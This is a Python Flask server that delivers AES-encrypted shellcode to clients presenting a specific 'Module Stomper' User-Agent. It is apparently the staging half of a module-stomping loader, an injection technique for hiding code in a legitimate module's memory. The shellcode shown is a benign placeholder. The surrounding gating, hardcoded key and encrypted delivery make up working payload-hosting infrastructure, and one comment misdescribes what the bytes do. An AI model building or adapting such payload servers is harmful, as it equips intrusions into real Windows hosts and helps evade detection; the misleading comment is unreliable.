from flask import Flask, request, send_file, abort
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
from waitress import serve
import logging
from io import BytesIO

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger('StompingServer')

class Config:
    KEY = "ModuleStomping2024".encode('utf-8').ljust(32, b'\0')
    IV = b"1234567890123456"
    EXPECTED_USER_AGENT = "Module Stomper/1.0"
    HOST = "0.0.0.0"
    PORT = 8080
    DEBUG = False

class ShellcodeProvider:
    @staticmethod
    def get_shellcode() -> bytes:
        """
        Shellcode x64 optimisé pour le module stomping
        Retourne 101 (0x65) via NtTerminateThread
        """
        return bytes([
            0x48, 0x83, 0xec, 0x28,          # sub rsp, 28h
            0x48, 0x31, 0xc0,                # xor rax, rax
            0xb8, 0x65, 0x00, 0x00, 0x00,    # mov eax, 101 (0x65)
            0x48, 0x83, 0xc4, 0x28,          # add rsp, 28h
            0xc3                              # ret
        ])

class CryptoManager:
    def __init__(self):
        self.cipher = Cipher(
            algorithms.AES(Config.KEY),
            modes.CBC(Config.IV),
            backend=default_backend()
        )

    def encrypt(self, data: bytes) -> bytes:
        padder = padding.PKCS7(128).padder()
        padded_data = padder.update(data) + padder.finalize()
        encryptor = self.cipher.encryptor()
        encrypted = encryptor.update(padded_data) + encryptor.finalize()
        logger.debug(f"Données après chiffrement: {len(encrypted)} bytes")
        return Config.IV + encrypted

app = Flask(__name__)
crypto_manager = CryptoManager()

@app.route('/shellcode', methods=['GET'])
def get_shellcode():
    try:
        if request.headers.get('User-Agent') != Config.EXPECTED_USER_AGENT:
            logger.warning(f"Invalid User-Agent: {request.headers.get('User-Agent')}")
            abort(403)

        logger.info(f"Shellcode request from {request.remote_addr}")

        shellcode = ShellcodeProvider.get_shellcode()
        logger.info(f"Shellcode généré: {len(shellcode)} bytes")
        logger.info(f"Contenu shellcode: {' '.join(f'{b:02X}' for b in shellcode)}")

        encrypted_data = crypto_manager.encrypt(shellcode)
        logger.info(f"Shellcode chiffré: {len(encrypted_data)} bytes")
        logger.info(f"Contenu chiffré: {' '.join(f'{b:02X}' for b in encrypted_data[:16])}")

        return send_file(
            BytesIO(encrypted_data),
            mimetype='application/octet-stream',
            as_attachment=True,
            download_name='shellcode.bin'
        )

    except Exception as e:
        logger.error(f"Error: {str(e)}")
        return "Internal Server Error", 500

def main():
    banner = f"""
{'='*50}
Module Stomping Server
{'='*50}
- Host: {Config.HOST}
- Port: {Config.PORT}
- User-Agent: {Config.EXPECTED_USER_AGENT}
- Debug: {Config.DEBUG}
{'='*50}
    """
    print(banner)
    serve(app, host=Config.HOST, port=Config.PORT)

if __name__ == '__main__':
    main()